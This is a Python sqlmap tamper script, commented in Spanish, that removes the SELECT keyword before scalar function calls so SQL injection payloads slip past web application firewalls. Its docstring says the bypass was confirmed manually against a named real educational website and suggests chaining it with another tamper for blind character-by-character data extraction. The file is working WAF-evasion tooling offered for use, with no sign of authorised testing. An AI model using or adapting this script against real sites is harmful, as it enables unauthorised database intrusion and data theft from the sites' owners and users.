#!/usr/bin/env python
"""
Tamper script de sqlmap propio de inyector.

Quita la keyword SELECT cuando antecede directo a una llamada de
función escalar sin FROM (DATABASE(), CURRENT_USER(), SUBSTRING(), ...).
Evade WAFs que bloquean SELECT sin importar el delimitador entre la
keyword y el paréntesis -- confirmado manualmente contra
itescam.edu.mx, donde ni '(SELECT/**/database())' ni ninguna otra
variante con espacio/comentario pasaba el filtro, pero '(database())'
sola sí. Combinar con --tamper=space2comment para la keyword AND/OR
que sigue bloqueada por espacio literal.

Ejemplo:
    * Input:  (SELECT DATABASE())
    * Output: (DATABASE())

La lista de funciones está acotada a las que sqlmap usa para
banner-grabbing / extracción boolean-blind carácter por carácter, que
nunca necesitan FROM -- aplicar esto a un 'SELECT ... FROM
information_schema...' real rompería la sintaxis.
"""

import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOWEST

SCALAR_FUNCS = (
    "DATABASE", "SCHEMA", "USER", "CURRENT_USER", "SESSION_USER",
    "SYSTEM_USER", "VERSION", "SUBSTRING", "SUBSTR", "MID", "ASCII",
    "ORD", "LENGTH", "CHAR_LENGTH", "CONCAT", "IFNULL", "COALESCE",
)

# SELECT + (espacio o comentario inline, en cualquier orden/cantidad --
# depende de qué otros tampers ya corrieron antes que este) + nombre de
# función + paréntesis de apertura.
_SEP = r"(?:\s|/\*.*?\*/)+"
PATTERN = re.compile(
    r"SELECT" + _SEP + r"(?=(?:" + _SEP + r")?(?:"
    + "|".join(SCALAR_FUNCS) + r")\s*\()",
    re.IGNORECASE,
)


def dependencies():
    pass


def tamper(payload, **kwargs):
    """Quita 'SELECT ' cuando precede directo a una función escalar
    conocida, dejando la llamada a función sola.

    >>> tamper('(SELECT DATABASE())')
    '(DATABASE())'
    >>> tamper('(SELECT/**/CURRENT_USER())')
    '(CURRENT_USER())'
    """
    if not payload:
        return payload

    return PATTERN.sub("", payload)
